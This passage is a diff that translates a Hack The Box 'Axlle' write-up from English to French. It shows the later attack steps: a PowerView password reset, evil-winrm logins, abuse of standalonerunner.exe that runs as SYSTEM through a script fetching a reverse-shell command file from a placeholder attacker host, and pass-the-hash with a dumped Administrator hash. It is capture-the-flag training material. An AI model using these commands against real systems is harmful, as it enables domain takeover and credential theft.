 <pre tabindex="0"><code>certutil.exe -urlcache -split -f http://YOUR_IP:WEBSERVER_PORT/PowerView.ps1 powerview.ps1
 
 Import-Module ./powerview.ps1
-</code></pre><p>We change the password of <code>baz.humphries</code>.</p>
+</code></pre><p>Nous changeons le mot de passe de <code>baz.humphries</code>.</p>
 <pre tabindex="0"><code>$pass = ConvertTo-SecureString &#39;PleaseLetMeIn007!&#39; -AsPlainText -Force
 
 Set-DomainUserPassword -Identity Baz.Humphries -AccountPassword $pass
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Axlle/password_change.png" alt="Baz Humphries password change"></p>
-<p>We login with evil-winrm as <code>baz.humphries</code>.</p>
+<p>Nous nous connectons avec evil-winrm en tant que <code>baz.humphries</code>.</p>
 <pre tabindex="0"><code>evil-winrm -u &#34;baz.humphries&#34; -p PleaseLetMeIn007! -i axlle.htb
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Axlle/baz_humphries_login.png" alt="Baz Humphries login"></p>
-<h2 id="privilege-escalation">Privilege Escalation</h2>
-<p>In <code>C:\App Development\kbfiltr</code> we find a <code>README.md</code> file. One of the line reads &ldquo;<strong>NOTE: I have automated the running of <code>C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\standalonerunner.exe</code> as SYSTEM to test and debug this driver in a standalone environment</strong>&rdquo;.</p>
+<h2 id="elévation-de-privilèges">Elévation de Privilèges</h2>
+<p>Dans <code>C:\App Development\kbfiltr</code> nous trouvons un fichier <code>README.md</code>. L&rsquo;une des lignes se lit comme suit &ldquo;<strong>NOTE: I have automated the running of <code>C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\standalonerunner.exe</code> as SYSTEM to test and debug this driver in a standalone environment</strong>&rdquo;.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Axlle/README-location.png" alt="README location"></p>
-<p><a href="https://github.com/nasbench/Misc-Research/blob/main/LOLBINs/StandaloneRunner.md" target="_blank" >This Github page</a>
+<p><a href="https://github.com/nasbench/Misc-Research/blob/main/LOLBINs/StandaloneRunner.md" target="_blank" >Cette page Github</a>
 
- shows how to exploit <code>StandaloneRunner.exe</code>.</p>
+ montre comment exploiter <code>StandaloneRunner.exe</code>.</p>
 <ol>
-<li>Create a <code>reboot.rsf</code> file, its content should be as below. This file should be in the current directory of execution where the <code>exe</code> and <code>dll</code> files are.</li>
+<li>Créer un fichier <code>reboot.rsf</code>, avec le contenu suivant. Ce fichier doit se trouver dans le même répertoire que <code>standalonerunner.exe</code> et <code>standalonexml.dll</code>.</li>
 </ol>
 <pre tabindex="0"><code>myTestDir
 True
 </code></pre><ol start="2">
 <li>
-<p>Create a directory with the following structure <code>myTestDir\working</code>.</p>
+<p>Créer un répertoire avec la structure suivante <code>myTestDir\working</code>.</p>
 </li>
 <li>
-<p>Create an empty <code>rsf.rsf</code> file inside <code>myTestDir\working</code>.</p>
+<p>Créer un fichier <code>rsf.rsf</code> vide dans <code>myTestDir\working</code>.</p>
 </li>
 <li>
-<p>Create <code>command.txt</code> with the reverse shell command in the same directory as <code>standalonerunner.exe</code>. (for the reverse shell I used PowerShell #3 (Base64) on <a href="https://www.revshells.com/" target="_blank" >revshells.com</a>
+<p>Créez <code>command.txt</code> avec le reverse shell dans le même répertoire que <code>standalonerunner.exe</code>. (pour le reverse shell, j&rsquo;ai utilisé PowerShell #3 (Base64) sur <a href="https://www.revshells.com/" target="_blank" >revshells.com</a>
 
 )</p>
 </li>
 </ol>
-<p>We can use the powershell script below to automate all these steps.</p>
+<p>Nous pouvons utiliser le script powershell ci-dessous pour automatiser toutes ces étapes.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>certutil.exe -urlcache -split <span style="color:#f92672">-f</span> <span style="color:#e6db74">&#34;http://YOUR_IP:WEBSERVER_PORT/reboot.rsf&#34;</span> <span style="color:#e6db74">&#34;reboot.rsf&#34;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>New-Item -Path <span style="color:#e6db74">&#34;myTestDir\working&#34;</span> -ItemType <span style="color:#e6db74">&#34;Directory&#34;</span> -Force
@@ -461,15 +461,15 @@ True
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>certutil.exe -urlcache -split <span style="color:#f92672">-f</span> <span style="color:#e6db74">&#34;http://YOUR_IP:WEBSERVER_PORT/command.txt&#34;</span> <span style="color:#e6db74">&#34;command.txt&#34;</span>
 </span></span></code></pre></div><p><img src="https://scorpiosec.com/images/HTB-Axlle/exploit_script.png" alt="exploit script"></p>
-<p>After a few seconds we get a shell as administrator and we can read the root flag.</p>
+<p>Après quelques secondes, nous obtenons un shell en tant qu&rsquo;administrateur et nous pouvons lire le drapeau root.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Axlle/root_flag.png" alt="root flag"></p>
-<h2 id="beyond-root">Beyond Root</h2>
-<p>Our access to the administrator account is a long and tedious process. In order to establish persistence we can switch to a meterpreter shell and dump the hashes with <code>hashdump</code>. We then recover the password hashes of many accounts on the target.</p>
+<h2 id="persistance">Persistance</h2>
+<p>Notre accès au compte administrateur est un processus long et fastidieux. Afin d&rsquo;établir la persistance, nous pouvons passer à un shell meterpreter et extraire les hashs avec <code>hashdump</code>. Nous récupérons alors les hachages des mots de passe de nombreux comptes sur la cible.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Axlle/hashdump.png" alt="hashdump command"></p>
-<p>We do not even need to crack it, since we can use them with evil-winrm in order to login.</p>
+<p>Nous n&rsquo;avons même pas besoin de les craquer, puisque nous pouvons les utiliser avec evil-winrm pour nous connecter.</p>
 <pre tabindex="0"><code>evil-winrm -u &#34;Administrator&#34; -H 6322b5b9f9daecb0fefd594fa6fafb6a -i dc.axlle.htb
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Axlle/Admin-login.png" alt="administrator login via evil-winrm"></p>
-<p>Thank you for reading this write up!</p>
+<p>Merci d&rsquo;avoir lu cet article!</p>
 
       </div>
     </article>
@@ -481,7 +481,7 @@ True
     <p>
         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
 
-        <span class="tag"><a href="https://scorpiosec.com/tags/hack-the-box/">Hack The Box</a></span>
+        <span class="tag"><a href="https://scorpiosec.com/fr/tags/hack-the-box/">Hack The Box</a></span>
         
     </p>
 
@@ -489,7 +489,7 @@ True
     <p>
         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
 
-        <span class="tag"><a href="https://scorpiosec.com/categories/writeups/">Writeups</a></span>
+        <span class="tag"><a href="https://scorpiosec.com/fr/categories/writeups/">Writeups</a></span>
         
     </p>
 
@@ -502,7 +502,7 @@ True
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        1618 Words
+        1714 Mots
       </p>
 
       <p>
@@ -524,7 +524,7 @@ True
       <hr />
       <div class="sharing-buttons">
         
-<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-axlle%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-axlle%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
   <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
     </div>
@@ -532,7 +532,7 @@ True
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-axlle%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-axlle%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
   <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
       <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
         <svg role="img" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
@@ -544,7 +544,7 @@ True
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=HTB%3a%20Axlle&amp;caption=HTB%3a%20Axlle&amp;canonicalUrl=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-axlle%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=HTB%3a%20Axlle&amp;caption=HTB%3a%20Axlle&amp;canonicalUrl=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-axlle%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
   <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
     <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
       <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
@@ -553,7 +553,7 @@ True
 </a>
 
 
-<a class="resp-sharing-button__link" href="mailto:?subject=HTB%3a%20Axlle&amp;body=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-axlle%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+<a class="resp-sharing-button__link" href="mailto:?subject=HTB%3a%20Axlle&amp;body=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-axlle%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
   <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
     </div>
@@ -561,7 +561,7 @@ True
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-axlle%2f&amp;media=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-axlle%2f;description=HTB%3a%20Axlle" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-axlle%2f&amp;media=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-axlle%2f;description=HTB%3a%20Axlle" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
   <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
     </div>
@@ -569,7 +569,7 @@ True
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-axlle%2f&amp;title=HTB%3a%20Axlle&amp;summary=HTB%3a%20Axlle&amp;source=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-axlle%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-axlle%2f&amp;title=HTB%3a%20Axlle&amp;summary=HTB%3a%20Axlle&amp;source=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-axlle%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
   <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
     </div>
@@ -577,7 +577,7 @@ True
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-axlle%2f&amp;resubmit=true&amp;title=HTB%3a%20Axlle" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-axlle%2f&amp;resubmit=true&amp;title=HTB%3a%20Axlle" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
   <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
     </div>
@@ -585,7 +585,7 @@ True
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-axlle%2f;title=HTB%3a%20Axlle" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-axlle%2f;title=HTB%3a%20Axlle" target="_blank" rel="noopener" aria-label="" title="Share on xing">
   <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
     </div>
@@ -593,7 +593,7 @@ True
 </a>
 
 
-<a class="resp-sharing-button__link" href="whatsapp://send?text=HTB%3a%20Axlle%20https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-axlle%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+<a class="resp-sharing-button__link" href="whatsapp://send?text=HTB%3a%20Axlle%20https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-axlle%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
   <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
     </div>
@@ -601,7 +601,7 @@ True
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-axlle%2f&amp;t=HTB%3a%20Axlle" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-axlle%2f&amp;t=HTB%3a%20Axlle" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
   <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
 			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
     </div>
@@ -609,7 +609,7 @@ True
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=HTB%3a%20Axlle&amp;url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-axlle%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=HTB%3a%20Axlle&amp;url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-axlle%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
   <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
       <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
     </div>
@@ -625,7 +625,7 @@ True
         <div class="pagination__buttons">
             
             <span class="button previous">
-                <a href="https://scorpiosec.com/posts/2024/11/htb-resource/">
+                <a href="https://scorpiosec.com/fr/posts/2024/11/htb-resource/">
                     <span class="button__icon">←</span>
                     <span class="button__text">HTB: Resource</span>
                 </a>
@@ -634,7 +634,7 @@ True
 
             
             <span class="button next">
-                <a href="https://scorpiosec.com/posts/2024/11/htb-blazorized/">
+                <a href="https://scorpiosec.com/fr/posts/2024/11/htb-blazorized/">
                     <span class="button__text">HTB: Blazorized</span>
                     <span class="button__icon">→</span>
                 </a>
